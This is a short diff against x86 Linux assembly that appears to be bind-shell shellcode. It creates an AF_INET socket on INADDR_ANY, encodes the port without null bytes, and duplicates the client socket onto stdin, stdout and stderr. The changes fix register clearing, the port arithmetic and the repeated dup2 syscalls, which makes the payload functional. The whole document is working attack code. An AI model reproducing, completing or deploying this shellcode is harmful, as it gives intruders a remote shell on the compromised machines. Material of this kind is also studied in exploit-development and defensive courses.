@@ -22,6 +22,7 @@ _start:
 	mov al, 2 ; domain = AF_INET
 	push eax
 	mov al, 102 ; syscall - socketcall
+	xor ebx,ebx
 	mov bl, 1   ; socket sockcall type
 	mov ecx, esp ; pointer to the args
 	int 0x80
@@ -37,10 +38,11 @@ _start:
 	push ebx ; null padding
 	push ebx ; null padding
 	push ebx ; INADDR_ANY
-	mov ebx, 0xf2f0272f
-	sub ebx, 0x0f0fff0f ;get 0x0200270f into ebx without any null bytes in the instructions
+	mov ebx, 0x2f27f0f2
+	and ebx, 0x0fff0f0f ;get 0x0200270f into ebx without any null bytes in the instructions
 	push ebx
 	mov ebx, esp ; now ebx has the address of the sockaddr_in struct
+        xor ecx,ecx
 	mov cl, 16
 	push ecx
 	push ebx
@@ -113,8 +115,10 @@ child:
 	xor eax,eax
 	mov al, 63 ; dup2 syscall
 	int 0x80 ; dup2(clientsock, 0)
+	mov al, 63
 	inc ecx
 	int 0x80 ; dup2(clientsock, 1)
+	mov al, 63
 	inc ecx
 	int 0x80 ; dup2(clientsock, 2)
 	
